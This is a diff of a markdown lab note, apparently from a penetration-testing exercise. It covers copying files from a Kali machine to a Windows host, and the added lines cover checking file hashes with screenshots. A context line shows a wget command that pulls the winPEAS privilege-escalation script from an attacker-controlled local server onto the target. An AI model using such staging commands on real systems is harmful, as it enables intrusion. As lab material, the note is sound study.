@@ -27,3 +27,9 @@ ON WINDOWS
 ```wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1```
 <img width="603" height="334" alt="image" src="https://github.com/user-attachments/assets/dfebb95e-397e-48ed-9f2a-9662e486cf6b" />
 
+Now verify the file hash
+ KALI:
+ <img width="665" height="83" alt="image" src="https://github.com/user-attachments/assets/794b8500-6284-45ff-9c83-3e521c556ff1" />
+
+ WINDOWS:
+ <img width="832" height="95" alt="image" src="https://github.com/user-attachments/assets/a67db2f3-a14a-43af-a663-29db86d49e7d" />
